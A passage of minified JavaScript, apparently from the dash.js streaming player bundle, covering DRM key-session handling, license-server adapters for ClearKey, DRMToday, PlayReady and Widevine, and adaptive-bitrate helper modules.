H=0;H<W.length;H++)E(W[H]);G.trigger(N.TEARDOWN_COMPLETE)}function E(H){try{O[h.cancelKeyRequest](R.systemString,H.sessionID)}catch(B){G.trigger(N.KEY_SESSION_CLOSED,{data:null,error:"Error closing session ("+H.sessionID+") "+B.message})}}function D(H,B){if(B&&H)for(var A=H.length,Y=0;Y<A;Y++)if(H[Y].sessionID==B)return H[Y];return null}function I(){O.removeEventListener(h.keyerror,ma),O.removeEventListener(h.needkey,ma),O.removeEventListener(h.keymessage,ma),O.removeEventListener(h.keyadded,ma)}z=z||{};var L=this.context,G=z.eventBus,N=z.events,w=z.debug,h=z.api,F=z.errHandler,P=z=void 0,O=void 0,R=void 0,Q=void 0,ja=void 0,W=void 0,aa=void 0,ma=void 0;return z={getAllInitData:function(){for(var H=[],B=0;B<ja.length;B++)H.push(ja[B].initData);for(B=0;B<W.length;B++)H.push(W[B].initData);return H},requestKeySystemAccess:function(H){for(var B=(B=O)||document.createElement("video"),A=!1,Y=0;Y<H.length;Y++)for(var Z=H[Y].ks.systemString,na=H[Y].configs,T=null,pa=0;pa<na.length;pa++){var ia=na[pa].videoCapabilities;if(ia&&0!==ia.length){T=[];for(var S=0;S<ia.length;S++)""!==B.canPlayType(ia[S].contentType,Z)&&T.push(ia[S])}if(T&&(!T||0!==T.length)){A=!0,na=new t.default(null,T),Z=Q.getKeySystemBySystemString(Z),G.trigger(N.KEY_SYSTEM_ACCESS_COMPLETE,{data:new r.default(Z,na)});break}}A||G.trigger(N.KEY_SYSTEM_ACCESS_COMPLETE,{error:"Key system access denied! -- No valid audio/video content configurations detected!"})},getKeySystem:function(){return R},selectKeySystem:function(H){R=H.keySystem,G.trigger(N.INTERNAL_KEY_SYSTEM_SELECTED)},setMediaElement:function(H){if(O!==H){if(O){I();for(var B=0;B<W.length;B++)E(W[B]);W=[]}(O=H)&&(O.addEventListener(h.keyerror,ma),O.addEventListener(h.needkey,ma),O.addEventListener(h.keymessage,ma),O.addEventListener(h.keyadded,ma),G.trigger(N.VIDEO_ELEMENT_SELECTED))}},createKeySession:function(H){if(!R)throw Error("Can not create sessions until you have selected a key system");if(aa||0===W.length){var B={sessionID:null,initData:H,getSessionID:function(){return this.sessionID},getExpirationTime:function(){return NaN},getSessionType:function(){return"temporary"}};return ja.push(B),O[h.generateKeyRequest](R.systemString,new Uint8Array(H)),B}throw Error("Multiple sessions not allowed!")},updateKeySession:function(H,B){var A=H.sessionID;if(Q.isClearKey(R))for(H=0;H<B.keyPairs.length;H++)O[h.addKey](R.systemString,B.keyPairs[H].key,B.keyPairs[H].keyID,A);else O[h.addKey](R.systemString,new Uint8Array(B),new Uint8Array(H.initData),A)},closeKeySession:E,setServerCertificate:function(){},loadKeySession:function(){},removeKeySession:function(){},stop:J,reset:J},P=w.getLogger(z),ja=[],W=[],Q=(R=O=null,p.default)(L).getInstance(),ma={handleEvent:function(H){var B=null;switch(H.type){case h.needkey:H=ArrayBuffer.isView(H.initData)?H.initData.buffer:H.initData,G.trigger(N.NEED_KEY,{key:new l.default(H,"cenc")});break;case h.keyerror:if(B=(B=D(W,H.sessionId))||D(ja,H.sessionId)){var A=x.default.MEDIA_KEYERR_CODE,Y="";switch(H.errorCode.code){case 1:A=x.default.MEDIA_KEYERR_UNKNOWN_CODE,Y+="MEDIA_KEYERR_UNKNOWN - "+x.default.MEDIA_KEYERR_UNKNOWN_MESSAGE;break;case 2:A=x.default.MEDIA_KEYERR_CLIENT_CODE,Y+="MEDIA_KEYERR_CLIENT - "+x.default.MEDIA_KEYERR_CLIENT_MESSAGE;break;case 3:A=x.default.MEDIA_KEYERR_SERVICE_CODE,Y+="MEDIA_KEYERR_SERVICE - "+x.default.MEDIA_KEYERR_SERVICE_MESSAGE;break;case 4:A=x.default.MEDIA_KEYERR_OUTPUT_CODE,Y+="MEDIA_KEYERR_OUTPUT - "+x.default.MEDIA_KEYERR_OUTPUT_MESSAGE;break;case 5:A=x.default.MEDIA_KEYERR_HARDWARECHANGE_CODE,Y+="MEDIA_KEYERR_HARDWARECHANGE - "+x.default.MEDIA_KEYERR_HARDWARECHANGE_MESSAGE;break;case 6:A=x.default.MEDIA_KEYERR_DOMAIN_CODE,Y+="MEDIA_KEYERR_DOMAIN - "+x.default.MEDIA_KEYERR_DOMAIN_MESSAGE}Y+="  System Code = "+H.systemCode,G.trigger(N.KEY_ERROR,{data:new f.default(A,Y,B)})}else P.error("No session token found for key error");break;case h.keyadded:(B=(B=D(W,H.sessionId))||D(ja,H.sessionId))?(P.debug("DRM: Key added."),G.trigger(N.KEY_ADDED,{data:B})):P.debug("No session token found for key added");break;case h.keymessage:(aa=null!==H.sessionId&&void 0!==H.sessionId)?!(B=D(W,H.sessionId))&&0<ja.length&&(B=ja.shift(),W.push(B),B.sessionID=H.sessionId,G.trigger(N.KEY_SESSION_CREATED,{data:B})):0<ja.length&&(B=ja.shift(),W.push(B),0!==ja.length&&F.error(new f.default(x.default.MEDIA_KEY_MESSAGE_ERROR_CODE,x.default.MEDIA_KEY_MESSAGE_ERROR_MESSAGE))),B?(A=ArrayBuffer.isView(H.message)?H.message.buffer:H.message,B.keyMessage=A,G.trigger(N.INTERNAL_KEY_MESSAGE,{data:new g.default(B,A,H.defaultURL)})):P.warn("No session token found for key message")}}},z}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(164)),l=v(u(183)),f=v(u(225)),g=v(u(178)),t=v(u(181)),r=v(u(180)),x=v(u(169));m.__dashjs_factory_name="ProtectionModel_01b",M.default=Na.FactoryMaker.getClassFactory(m),da.exports=M.default},{164:164,169:169,178:178,180:180,181:181,183:183,225:225}],171:[function(u,da,M){function v(z){return z&&z.__esModule?z:{default:z}}function m(z){function J(W){var aa=W.session;return aa.removeEventListener("keystatuseschange",W),aa.removeEventListener("message",W),aa.close()}function E(W){for(var aa=0;aa<R.length;aa++)if(R[aa]===W){R.splice(aa,1);break}}function D(W){var aa=void 0,ma=void 0;return W&&0<W.length&&(W[0]&&("string"==typeof W[0]?aa=W[0]:ma=W[0]),W[1]&&("string"==typeof W[1]?aa=W[1]:ma=W[1])),{status:aa,keyId:ma}}function I(W,aa,ma,H){var B={session:W,initData:aa,sessionId:H,handleEvent:function(A){switch(A.type){case"keystatuseschange":G.trigger(N.KEY_STATUSES_CHANGED,{data:this}),A.target.keyStatuses.forEach((function(){var Z=D(arguments);"expired"===Z.status?G.trigger(N.INTERNAL_KEY_STATUS_CHANGED,{error:new g.default(f.default.KEY_STATUS_CHANGED_EXPIRED_ERROR_CODE,f.default.KEY_STATUS_CHANGED_EXPIRED_ERROR_MESSAGE)}):G.trigger(N.INTERNAL_KEY_STATUS_CHANGED,Z)}));break;case"message":var Y=ArrayBuffer.isView(A.message)?A.message.buffer:A.message;G.trigger(N.INTERNAL_KEY_MESSAGE,{data:new t.default(this,Y,void 0,A.messageType)})}},getSessionID:function(){return W.sessionId},getExpirationTime:function(){return W.expiration},getKeyStatuses:function(){return W.keyStatuses},getUsable:function(){var A=!1;return W.keyStatuses.forEach((function(){"usable"===D(arguments).status&&(A=!0)})),A},getSessionType:function(){return ma}};return W.addEventListener("keystatuseschange",B),W.addEventListener("message",B),W.closed.then((function(){E(B),h.debug("DRM: Session closed.  SessionID = "+B.getSessionID()),G.trigger(N.KEY_SESSION_CLOSED,{data:B.getSessionID()})})),R.push(B),B}z=z||{};var L=this.context,G=z.eventBus,N=z.events;z=z.debug;var w,h=void 0,F=void 0,P=void 0,O=void 0,R=void 0,Q=void 0,ja=void 0;return w={getAllInitData:function(){for(var W=[],aa=0;aa<R.length;aa++)R[aa].initData&&W.push(R[aa].initData);return W},requestKeySystemAccess:function(W){!function B(ma,H){var A,Y,Z,na;void 0!==navigator.requestMediaKeySystemAccess&&"function"==typeof navigator.requestMediaKeySystemAccess?(Y=ma[A=H].ks,Z=ma[A].configs,(na=Y.systemString)===x.default.PLAYREADY_KEYSTEM_STRING&&"required"===Z[0].persistentState&&(na+=".recommendation"),navigator.requestMediaKeySystemAccess(na,Z).then((function(T){var pa="function"==typeof T.getConfiguration?T.getConfiguration():null;(pa=new r.default(Y,pa)).mksa=T,G.trigger(N.KEY_SYSTEM_ACCESS_COMPLETE,{data:pa})})).catch((function(T){++A<ma.length?B(ma,A):G.trigger(N.KEY_SYSTEM_ACCESS_COMPLETE,{error:"Key system access denied! "+T.message})}))):G.trigger(N.KEY_SYSTEM_ACCESS_COMPLETE,{error:"Insecure origins are not allowed"})}(W,0)},getKeySystem:function(){return F},selectKeySystem:function(W){W.mksa.createMediaKeys().then((function(aa){F=W.keySystem,O=aa,P?P.setMediaKeys(O).then((function(){G.trigger(N.INTERNAL_KEY_SYSTEM_SELECTED)})):G.trigger(N.INTERNAL_KEY_SYSTEM_SELECTED)})).catch((function(){G.trigger(N.INTERNAL_KEY_SYSTEM_SELECTED,{error:"Error selecting keys system ("+W.keySystem.systemString+")! Could not create MediaKeys -- TODO"})}))},setMediaElement:function(W){P!==W&&(P&&(P.removeEventListener("encrypted",Q),P.setMediaKeys&&P.setMediaKeys(null)),(P=W)&&(P.addEventListener("encrypted",Q),P.setMediaKeys&&O&&P.setMediaKeys(O)))},setServerCertificate:function(W){if(!F||!O)throw Error("Can not set server certificate until you have selected a key system");O.setServerCertificate(W).then((function(){h.info("DRM: License server certificate successfully updated."),G.trigger(N.SERVER_CERTIFICATE_UPDATED)})).catch((function(aa){G.trigger(N.SERVER_CERTIFICATE_UPDATED,{error:new g.default(f.default.SERVER_CERTIFICATE_UPDATED_ERROR_CODE,f.default.SERVER_CERTIFICATE_UPDATED_ERROR_MESSAGE+aa.name)})}))},createKeySession:function(W,aa,ma){if(!F||!O)throw Error("Can not create sessions until you have selected a key system");var H=O.createSession(ma),B=I(H,W,ma);aa=this.getKeySystem().systemString===x.default.CLEARKEY_KEYSTEM_STRING&&aa&&aa.clearkeys?"keyids":"cenc",H.generateRequest(aa,W).then((function(){h.debug("DRM: Session created.  SessionID = "+B.getSessionID()),G.trigger(N.KEY_SESSION_CREATED,{data:B})})).catch((function(A){E(B),G.trigger(N.KEY_SESSION_CREATED,{data:null,error:new g.default(f.default.KEY_SESSION_CREATED_ERROR_CODE,f.default.KEY_SESSION_CREATED_ERROR_MESSAGE+"Error generating key request -- "+A.name)})}))},updateKeySession:function(W,aa){var ma=W.session;ja.isClearKey(F)&&(aa=aa.toJWK()),ma.update(aa).catch((function(H){G.trigger(N.KEY_ERROR,{data:new g.default(f.default.MEDIA_KEYERR_CODE,"Error sending update() message! "+H.name,W)})}))},loadKeySession:function(W,aa,ma){if(!F||!O)throw Error("Can not load sessions until you have selected a key system");for(var H=0;H<R.length;H++)if(W===R[H].sessionId)return void h.warn("DRM: Ignoring session ID because we have already seen it!");var B=I(H=O.createSession(ma),aa,ma,W);H.load(W).then((function(A){A?(h.debug("DRM: Session loaded.  SessionID = "+B.getSessionID()),G.trigger(N.KEY_SESSION_CREATED,{data:B})):(E(B),G.trigger(N.KEY_SESSION_CREATED,{data:null,error:new g.default(f.default.KEY_SESSION_CREATED_ERROR_CODE,f.default.KEY_SESSION_CREATED_ERROR_MESSAGE+"Could not load session! Invalid Session ID ("+W+")")}))})).catch((function(A){E(B),G.trigger(N.KEY_SESSION_CREATED,{data:null,error:new g.default(f.default.KEY_SESSION_CREATED_ERROR_CODE,f.default.KEY_SESSION_CREATED_ERROR_MESSAGE+"Could not load session ("+W+")! "+A.name)})}))},removeKeySession:function(W){W.session.remove().then((function(){h.debug("DRM: Session removed.  SessionID = "+W.getSessionID()),G.trigger(N.KEY_SESSION_REMOVED,{data:W.getSessionID()})}),(function(aa){G.trigger(N.KEY_SESSION_REMOVED,{data:null,error:"Error removing session ("+W.getSessionID()+"). "+aa.name})}))},closeKeySession:function(W){J(W).catch((function(aa){E(W),G.trigger(N.KEY_SESSION_CLOSED,{data:null,error:"Error closing session ("+W.getSessionID()+") "+aa.name})}))},stop:function(){for(var W=void 0,aa=0;aa<R.length;aa++)(W=R[aa]).getUsable()||J(W).catch((function(){E(W)}))},reset:function(){var W=R.length,aa=void 0;0!==W?function(){for(var ma=function(B){E(B),0===R.length&&(P?(P.removeEventListener("encrypted",Q),P.setMediaKeys(null).then((function(){G.trigger(N.TEARDOWN_COMPLETE)}))):G.trigger(N.TEARDOWN_COMPLETE))},H=0;H<W;H++)!function(B){aa.session.closed.then((function(){ma(B)})),J(aa).catch((function(){ma(B)}))}(aa=R[H])}():G.trigger(N.TEARDOWN_COMPLETE)}},h=z.getLogger(w),R=[],ja=(O=P=F=null,p.default)(L).getInstance(),Q={handleEvent:function(W){var aa;"encrypted"===W.type&&W.initData&&(aa=ArrayBuffer.isView(W.initData)?W.initData.buffer:W.initData,G.trigger(N.NEED_KEY,{key:new l.default(aa,W.initDataType)}))}},w}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(164)),l=v(u(183)),f=v(u(169)),g=v(u(225)),t=v(u(178)),r=v(u(180)),x=v(u(110));m.__dashjs_factory_name="ProtectionModel_21Jan2015",M.default=Na.FactoryMaker.getClassFactory(m),da.exports=M.default},{110:110,164:164,169:169,178:178,180:180,183:183,225:225}],172:[function(u,da,M){function v(z){return z&&z.__esModule?z:{default:z}}function m(z){function J(){try{for(var aa=0;aa<Q.length;aa++)E(Q[aa]);F&&F.removeEventListener(w.needkey,ja),L.trigger(G.TEARDOWN_COMPLETE)}catch(ma){L.trigger(G.TEARDOWN_COMPLETE,{error:"Error tearing down key sessions and MediaKeys! -- "+ma.message})}}function E(aa){var ma=aa.session;ma.removeEventListener(w.error,aa),ma.removeEventListener(w.message,aa),ma.removeEventListener(w.ready,aa),ma.removeEventListener(w.close,aa);for(var H=0;H<Q.length;H++)if(Q[H]===aa){Q.splice(H,1);break}ma[w.release]()}function D(){function aa(){F.removeEventListener("loadedmetadata",ma),F[w.setMediaKeys](O),L.trigger(G.VIDEO_ELEMENT_SELECTED)}var ma=null;1<=F.readyState?aa():(ma=aa.bind(this),F.addEventListener("loadedmetadata",ma))}z=z||{};var I=this.context,L=z.eventBus,G=z.events,N=z.debug,w=z.api,h=z=void 0,F=void 0,P=void 0,O=void 0,R=void 0,Q=void 0,ja=void 0,W=void 0;return z={getAllInitData:function(){for(var aa=[],ma=0;ma<Q.length;ma++)aa.push(Q[ma].initData);return aa},requestKeySystemAccess:function(aa){for(var ma=!1,H=0;H<aa.length;H++)for(var B=aa[H].ks.systemString,A=aa[H].configs,Y=null,Z=null,na=0;na<A.length;na++){var T=A[na].audioCapabilities,pa=A[na].videoCapabilities;if(T&&0!==T.length){Y=[];for(var ia=0;ia<T.length;ia++)wa[w.MediaKeys].isTypeSupported(B,T[ia].contentType)&&Y.push(T[ia])}if(pa&&0!==pa.length)for(Z=[],T=0;T<pa.length;T++)wa[w.MediaKeys].isTypeSupported(B,pa[T].contentType)&&Z.push(pa[T]);if(!(!Y&&!Z||Y&&0===Y.length||Z&&0===Z.length)){ma=!0,A=new r.default(Y,Z),B=W.getKeySystemBySystemString(B),L.trigger(G.KEY_SYSTEM_ACCESS_COMPLETE,{data:new x.default(B,A)});break}}ma||L.trigger(G.KEY_SYSTEM_ACCESS_COMPLETE,{error:"Key system access denied! -- No valid audio/video content configurations detected!"})},getKeySystem:function(){return P},selectKeySystem:function(aa){try{O=aa.mediaKeys=new wa[w.MediaKeys](aa.keySystem.systemString),P=aa.keySystem,R=aa,F&&D(),L.trigger(G.INTERNAL_KEY_SYSTEM_SELECTED)}catch(ma){L.trigger(G.INTERNAL_KEY_SYSTEM_SELECTED,{error:"Error selecting keys system ("+P.systemString+")! Could not create MediaKeys -- TODO"})}},setMediaElement:function(aa){F!==aa&&(F&&F.removeEventListener(w.needkey,ja),(F=aa)&&(F.addEventListener(w.needkey,ja),O&&D()))},createKeySession:function(aa,ma,H,B){if(!P||!O||!R)throw Error("Can not create sessions until you have selected a key system");if(ma=null,R.ksConfiguration.videoCapabilities&&0<R.ksConfiguration.videoCapabilities.length&&(ma=R.ksConfiguration.videoCapabilities[0]),null===ma&&R.ksConfiguration.audioCapabilities&&0<R.ksConfiguration.audioCapabilities.length&&(ma=R.ksConfiguration.audioCapabilities[0]),null===ma)throw Error("Can not create sessions for unknown content types.");aa={session:B=O.createSession(ma.contentType,new Uint8Array(aa),B?new Uint8Array(B):null),initData:aa,getSessionID:function(){return this.session.sessionId},getExpirationTime:function(){return NaN},getSessionType:function(){return"temporary"},handleEvent:function(A){switch(A.type){case w.error:L.trigger(G.KEY_ERROR,{data:new f.default(g.default.MEDIA_KEYERR_CODE,"KeyError",this)});break;case w.message:var Y=ArrayBuffer.isView(A.message)?A.message.buffer:A.message;L.trigger(G.INTERNAL_KEY_MESSAGE,{data:new t.default(this,Y,A.destinationURL)});break;case w.ready:h.debug("DRM: Key added."),L.trigger(G.KEY_ADDED);break;case w.close:h.debug("DRM: Session closed.  SessionID = "+this.getSessionID()),L.trigger(G.KEY_SESSION_CLOSED,{data:this.getSessionID()})}}},B.addEventListener(w.error,aa),B.addEventListener(w.message,aa),B.addEventListener(w.ready,aa),B.addEventListener(w.close,aa),Q.push(aa),h.debug("DRM: Session created.  SessionID = "+aa.getSessionID()),L.trigger(G.KEY_SESSION_CREATED,{data:aa})},updateKeySession:function(aa,ma){aa=aa.session,W.isClearKey(P)?aa.update(new Uint8Array(ma.toJWK())):aa.update(new Uint8Array(ma))},closeKeySession:E,setServerCertificate:function(){},loadKeySession:function(){},removeKeySession:function(){},stop:J,reset:J},h=N.getLogger(z),Q=[],W=(R=O=P=F=null,p.default)(I).getInstance(),ja={handleEvent:function(aa){var ma;aa.type===w.needkey&&aa.initData&&(ma=ArrayBuffer.isView(aa.initData)?aa.initData.buffer:aa.initData,L.trigger(G.NEED_KEY,{key:new l.default(ma,"cenc")}))}},z}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(164)),l=v(u(183)),f=v(u(225)),g=v(u(169)),t=v(u(178)),r=v(u(181)),x=v(u(180));m.__dashjs_factory_name="ProtectionModel_3Feb2014",M.default=Na.FactoryMaker.getClassFactory(m),da.exports=M.default},{164:164,169:169,178:178,180:180,181:181,183:183,225:225}],173:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(){return{getServerURLFromMessage:function(f,g){g=JSON.parse(String.fromCharCode.apply(null,new Uint8Array(g))),f+="/?";for(var t=0;t<g.kids.length;t++)f+=g.kids[t]+"&";return f.substring(0,f.length-1)},getHTTPMethod:function(){return"GET"},getResponseType:function(){return"json"},getLicenseMessage:function(f){if(!f.hasOwnProperty("keys"))return null;for(var g=[],t=0;t<f.keys.length;t++){var r=f.keys[t],x=r.kid.replace(/=/g,"");r=r.k.replace(/=/g,""),g.push(new p.default(x,r))}return new l.default(g)},getErrorResponse:function(f){return String.fromCharCode.apply(null,new Uint8Array(f))}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(179)),l=v(u(177));m.__dashjs_factory_name="ClearKey",M.default=Na.FactoryMaker.getSingletonFactory(m),da.exports=M.default},{177:177,179:179}],174:[function(u,da,M){function v(l){var f=(l=l||{}).BASE64,g={};return g[p.default.WIDEVINE_KEYSTEM_STRING]={responseType:"json",getLicenseMessage:function(t){return f.decodeArray(t.license)},getErrorResponse:function(t){return t}},g[p.default.PLAYREADY_KEYSTEM_STRING]={responseType:"arraybuffer",getLicenseMessage:function(t){return t},getErrorResponse:function(t){return String.fromCharCode.apply(null,new Uint8Array(t))}},{getServerURLFromMessage:function(t){return t},getHTTPMethod:function(){return"POST"},getResponseType:function(t){return g[t].responseType},getLicenseMessage:function(t,r){if(!f||!f.hasOwnProperty("decodeArray"))throw Error("Missing config parameter(s)");return g[r].getLicenseMessage(t)},getErrorResponse:function(t,r){return g[r].getErrorResponse(t)}}}Object.defineProperty(M,"__esModule",{value:!0});var m,p=(m=u(110))&&m.__esModule?m:{default:m};v.__dashjs_factory_name="DRMToday",M.default=Na.FactoryMaker.getSingletonFactory(v),da.exports=M.default},{110:110}],175:[function(u,da,M){function v(){function m(p){return p=String.fromCharCode.apply(null,new Uint8Array(p)),decodeURIComponent(escape(p))}return{getServerURLFromMessage:function(p){return p},getHTTPMethod:function(){return"POST"},getResponseType:function(){return"arraybuffer"},getLicenseMessage:function(p){if(wa.DOMParser){var l=m(p);(l=(l=(l=(new wa.DOMParser).parseFromString(l,"text/xml"))?l.getElementsByTagNameNS("http://schemas.xmlsoap.org/soap/envelope/","Envelope")[0]:null)?l.getElementsByTagNameNS("http://schemas.xmlsoap.org/soap/envelope/","Body")[0]:null)&&l.getElementsByTagNameNS("http://schemas.xmlsoap.org/soap/envelope/","Fault")[0]&&(p=null)}return p},getErrorResponse:function(p){a:{var l="",f="",g="",t=-1,r=-1;if(wa.DOMParser){l=m(p);var x=(p=(p=(p=(p=(new wa.DOMParser).parseFromString(l,"text/xml"))?p.getElementsByTagNameNS("http://schemas.xmlsoap.org/soap/envelope/","Envelope")[0]:null)?p.getElementsByTagNameNS("http://schemas.xmlsoap.org/soap/envelope/","Body")[0]:null)?p.getElementsByTagNameNS("http://schemas.xmlsoap.org/soap/envelope/","Fault")[0]:null)?p.getElementsByTagName("detail")[0]:null;x=x?x.getElementsByTagName("Exception")[0]:null;var z=null;if(null===p){g=l;break a}l=(z=p.getElementsByTagName("faultstring")[0].firstChild)?z.nodeValue:null,null!==x&&(f=(z=x.getElementsByTagName("StatusCode")[0])?z.firstChild.nodeValue:null,t=(g=(z=x.getElementsByTagName("Message")[0])?z.firstChild.nodeValue:null)?g.lastIndexOf("[")+1:-1,r=g?g.indexOf("]"):-1,g=g?g.substring(t,r):"")}f="code: "+f+", name: "+l,g&&(f+=", message: "+g),g=f}return g}}}Object.defineProperty(M,"__esModule",{value:!0}),v.__dashjs_factory_name="PlayReady",M.default=Na.FactoryMaker.getSingletonFactory(v),da.exports=M.default},{}],176:[function(u,da,M){function v(){return{getServerURLFromMessage:function(m){return m},getHTTPMethod:function(){return"POST"},getResponseType:function(){return"arraybuffer"},getLicenseMessage:function(m){return m},getErrorResponse:function(m){return String.fromCharCode.apply(null,new Uint8Array(m))}}}Object.defineProperty(M,"__esModule",{value:!0}),v.__dashjs_factory_name="Widevine",M.default=Na.FactoryMaker.getSingletonFactory(v),da.exports=M.default},{}],177:[function(u,da,M){function v(p,l){for(var f=0;f<l.length;f++){var g=l[f];g.enumerable=g.enumerable||!1,g.configurable=!0,"value"in g&&(g.writable=!0),Object.defineProperty(p,g.key,g)}}function m(p,l){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");if(l&&"persistent"!==l&&"temporary"!==l)throw Error("Invalid ClearKey key set type!  Must be one of 'persistent' or 'temporary'");this.keyPairs=p,this.type=l}var p,l;Object.defineProperty(M,"__esModule",{value:!0}),p=m,l=[{key:"toJWK",value:function(){var p,l=this.keyPairs.length,f={keys:[]};for(p=0;p<l;p++)f.keys.push({kty:"oct",alg:"A128KW",kid:this.keyPairs[p].keyID,k:this.keyPairs[p].key});this.type&&(f.type=this.type),f=(l=JSON.stringify(f)).length;var g=new ArrayBuffer(f),t=new Uint8Array(g);for(p=0;p<f;p++)t[p]=l.charCodeAt(p);return g}}],l&&v(p.prototype,l),u=m,M.default=u,da.exports=M.default},{}],178:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function g(m,p,l,f){if(!(this instanceof g))throw new TypeError("Cannot call a class as a function");this.sessionToken=m,this.message=p,this.defaultURL=l,this.messageType=f||"license-request"},da.exports=M.default},{}],179:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function l(m,p){if(!(this instanceof l))throw new TypeError("Cannot call a class as a function");this.keyID=m,this.key=p},da.exports=M.default},{}],180:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function l(m,p){if(!(this instanceof l))throw new TypeError("Cannot call a class as a function");this.keySystem=m,this.ksConfiguration=p},da.exports=M.default},{}],181:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function t(m,p,l,f,g){if(!(this instanceof t))throw new TypeError("Cannot call a class as a function");this.initDataTypes=["cenc"],m&&m.length&&(this.audioCapabilities=m),p&&p.length&&(this.videoCapabilities=p),this.distinctiveIdentifier=l,this.persistentState=f,this.sessionTypes=g},da.exports=M.default},{}],182:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function l(m,p){if(!(this instanceof l))throw new TypeError("Cannot call a class as a function");this.contentType=m,this.robustness=p},da.exports=M.default},{}],183:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function l(m,p){if(!(this instanceof l))throw new TypeError("Cannot call a class as a function");this.initData=m,this.initDataType=p},da.exports=M.default},{}],184:[function(u,da,M){function v(){var p=[],l=0,f=0;return{push:function(g,t){var r=t&&t.droppedVideoFrames?t.droppedVideoFrames:0;t=t&&t.totalVideoFrames?t.totalVideoFrames:0;var x=r-l;l=r,r=t-f,f=t,isNaN(g)||(p[g]?(p[g].droppedVideoFrames+=x,p[g].totalVideoFrames+=r):p[g]={droppedVideoFrames:x,totalVideoFrames:r})},getFrameHistory:function(){return p},reset:function(g){p=[],l=g.droppedVideoFrames,f=g.totalVideoFrames}}}var m;Object.defineProperty(M,"__esModule",{value:!0}),u=(m=u(47))&&m.__esModule?m:{default:m},v.__dashjs_factory_name="DroppedFramesHistory",m=u.default.getClassFactory(v),M.default=m,da.exports=M.default},{47:47}],185:[function(u,da,M){function v(p){function l(){return J?J.mediaInfo:null}var f=(p=p||{}).abrController,g=p.switchHistory,t=p.droppedFramesHistory,r=p.currentRequest,x=p.useBufferOccupancyABR,z=p.streamProcessor?p.streamProcessor.getScheduleController():null,J=p.streamProcessor?p.streamProcessor.getRepresentationInfo():null;return{getMediaType:function(){var E=l();return E?E.type:null},getMediaInfo:l,getDroppedFramesHistory:function(){return t},getCurrentRequest:function(){return r},getSwitchHistory:function(){return g},getStreamInfo:function(){var E=l();return E?E.streamInfo:null},getScheduleController:function(){return z},getAbrController:function(){return f},getRepresentationInfo:function(){return J},useBufferOccupancyABR:function(){return x}}}var m;Object.defineProperty(M,"__esModule",{value:!0}),u=(m=u(47))&&m.__esModule?m:{default:m},v.__dashjs_factory_name="RulesContext",M.default=u.default.getClassFactory(v),da.exports=M.default},{47:47}],186:[function(u,da,M){function v(l,f,g){return{quality:void 0===l?-1:l,reason:void 0===f?null:f,priority:g!==p.DEFAULT&&g!==p.STRONG&&g!==p.WEAK?p.DEFAULT:g}}var m;Object.defineProperty(M,"__esModule",{value:!0}),u=(m=u(47))&&m.__esModule?m:{default:m};var p={DEFAULT:.5,STRONG:1,WEAK:0};v.__dashjs_factory_name="SwitchRequest",(m=u.default.getClassFactory(v)).NO_CHANGE=-1,m.PRIORITY=p,u.default.updateClassFactory(v.__dashjs_factory_name,m),M.default=m,da.exports=M.default},{47:47}],187:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(){var f=[],g=[];return{push:function(t){t.newValue===l.default.NO_CHANGE&&(t.newValue=t.oldValue),f[t.oldValue]||(f[t.oldValue]={noDrops:0,drops:0,dropSize:0});var r,x=t.newValue-t.oldValue,z=0>x?1:0;x=z?-x:0;var J=z?0:1;f[t.oldValue].drops+=z,f[t.oldValue].dropSize+=x,f[t.oldValue].noDrops+=J,g.push({idx:t.oldValue,noDrop:J,drop:z,dropSize:x}),8<g.length&&(r=g.shift(),f[r.idx].drops-=r.drop,f[r.idx].dropSize-=r.dropSize,f[r.idx].noDrops-=r.noDrop)},getSwitchRequests:function(){return f},reset:function(){f=[],g=[]}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(186));m.__dashjs_factory_name="SwitchRequestHistory",u=p.default.getClassFactory(m),M.default=u,da.exports=M.default},{186:186,47:47}],188:[function(u,da,M){function v(l){return l&&l.__esModule?l:{default:l}}function m(l){function f(G,N,w,h){var F=Math.pow(.5,w/h.fast);G.fastEstimate=(1-F)*N+F*G.fastEstimate,h=Math.pow(.5,w/h.slow),G.slowEstimate=(1-h)*N+h*G.slowEstimate,G.totalWeight+=w}function g(G,N,w){return z.get().streaming.abr.movingAverageMethod!==p.default.MOVING_AVERAGE_SLIDING_WINDOW?(Q=N,ja=(R=G)?L.throughputHalfLife:L.latencyHalfLife,!(W=R?D[Q]:I[Q])||0>=W.totalWeight?NaN:(Q=W.fastEstimate/(1-Math.pow(.5,W.totalWeight/ja.fast)),ja=W.slowEstimate/(1-Math.pow(.5,W.totalWeight/ja.slow)),R?Math.min(Q,ja):Math.max(Q,ja))):(P=function(R,Q,ja){var W=void 0;if(Q=R?(W=J[Q],ja?3:4):(W=E[Q],4),W){if(Q>=W.length)Q=W.length;else if(R)for(R=1;R<Q&&(!(1.3<=(ja=W[W.length-R]/W[W.length-R-1])||ja<=1/1.3)||(Q+=1)!==W.length);++R);}else Q=0;return Q}(h=G,F=N,w),O=(h?J:E)[F],0!==P&&O&&0!==O.length?(O=O.slice(-P)).reduce((function(R,Q){return R+Q}))/O.length:NaN);var R,Q,ja,W,h,F,P,O}function t(G,N){return g(!0,G,N)}function r(G){J[G]=J[G]||[],E[G]=E[G]||[],D[G]=D[G]||{fastEstimate:0,slowEstimate:0,totalWeight:0},I[G]=I[G]||{fastEstimate:0,slowEstimate:0,totalWeight:0}}function x(){J={},E={},D={},I={}}var z=(l=l||{}).settings,J=void 0,E=void 0,D=void 0,I=void 0,L=void 0;return l={push:function(G,N,w){if(N.trace&&N.trace.length){var O,h=N.tresponse.getTime()-N.trequest.getTime()||1,F=N._tfinish.getTime()-N.tresponse.getTime()||1,P=N.trace.reduce((function(R,Q){return R+Q.b[0]}),0);if(O=z.get().streaming.lowLatencyEnabled?N.trace.reduce((function(R,Q){return 